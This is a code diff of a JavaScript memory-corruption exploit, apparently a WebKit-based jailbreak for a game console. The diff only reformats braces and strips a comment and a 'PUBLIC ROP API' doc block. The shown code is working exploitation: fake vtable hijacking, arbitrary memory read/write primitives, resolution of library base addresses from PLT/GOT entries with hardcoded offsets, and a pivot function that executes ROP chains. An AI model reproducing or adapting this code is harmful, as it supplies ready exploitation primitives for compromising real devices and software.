@@ -15,8 +15,7 @@ write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
 
 var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
 
-function get_got_addr(idx)
-{
+function get_got_addr(idx) {
     var p = plt_ptr + idx * 16;
     var q = read_mem(p, 6);
     if(q[0] != 0xff || q[1] != 0x25)
@@ -28,7 +27,6 @@ function get_got_addr(idx)
     return read_ptr_at(offset);
 }
 
-//these are not real bases but rather some low addresses
 var webkit_base = read_ptr_at(fake_vtable);
 var libkernel_base = get_got_addr(705)-0x10000;
 var libc_base = get_got_addr(582);
@@ -42,8 +40,7 @@ var jop_frame_addr = libc_base+0x715d0;
 var get_errno_addr_addr = libkernel_base+0x9ff0;
 var pthread_create_addr = libkernel_base+0xf980;
 
-function saveall()
-{
+function saveall() {
     var ans = malloc(0x800);
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
@@ -59,15 +56,7 @@ function saveall()
     return ans;
 }
 
-/* PUBLIC ROP API
-
-This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
-* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
-* the actual ROP chain starts at `buf+8`
-* jump to `pivot_addr` to return
-*/
-function pivot(buf)
-{
+function pivot(buf) {
     var ans = malloc(0x400);
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
